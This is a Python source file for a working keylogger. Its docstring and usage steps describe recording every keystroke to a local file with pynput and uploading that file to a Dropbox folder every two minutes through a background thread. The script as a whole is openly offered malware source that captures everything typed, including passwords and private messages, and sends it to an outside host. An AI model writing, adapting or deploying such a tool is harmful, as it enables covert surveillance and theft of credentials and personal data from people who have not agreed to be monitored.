
#!/usr/bin/env python3
# keyLogger.py

"""
KeyLogger with Dropbox Integration

Description:
This script logs keystrokes to a local file and uploads the log file to a specified Dropbox folder every 2 minutes. It captures all key presses, including special characters and whitespace, and ensures that the log is periodically backed up to your Dropbox account for secure storage and access.

Usage:
1. Ensure you have the required Python packages installed: dropbox and pynput.
2. Replace 'YOUR_DROPBOX_ACCESS_TOKEN' with your actual Dropbox access token.
3. Adjust 'LOG_FILE_PATH' if needed to specify the desired log file location.
4. Run the script, and it will start logging keystrokes and uploading the log to Dropbox every 2 minutes.

Prerequisites:
- Python 3.x
- pip (Python package installer)
- Dropbox account with an access token
- Required Python packages: dropbox, pynput
- See github page for detailed instruction

Author: Drew Mayberry
Date: June 28, 2024
"""

import dropbox
from pynput import keyboard
import threading
import time

# Hardcoded configuration
DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN'  # Replace with your actual Dropbox access token
LOG_FILE_PATH = 'keyLogger.txt'  # Replace with the desired log file path (saves to current directory)

# Initialize Dropbox client
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# Replace /APP/FOLDER/keyLogger.txt with your actual path to your dropbox folder
def upload_log():
    with open(LOG_FILE_PATH, 'rb') as f:
        dbx.files_upload(f.read(), '/APP/FOLDER/keyLogger.txt', mode=dropbox.files.WriteMode.overwrite)
    print("Log uploaded to Dropbox")

def schedule_upload(interval):
    while True:
        time.sleep(interval)
        upload_log()

def on_press(key):
    try:
        log = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = ' '
        elif key == keyboard.Key.enter:
            log = 'ENTER '
        elif key == keyboard.Key.shift:
            log = 'SHIFT '
        elif key == keyboard.Key.shift_r:
            log = 'SHIFT_R '
        elif key == keyboard.Key.backspace:
            log = 'BACKSPACE '
        else:
            log = f'{key} '
    with open(LOG_FILE_PATH, 'a') as f:
        f.write(log)

if __name__ == "__main__":
    upload_thread = threading.Thread(target=schedule_upload, args=(120,))
    upload_thread.daemon = True
    upload_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
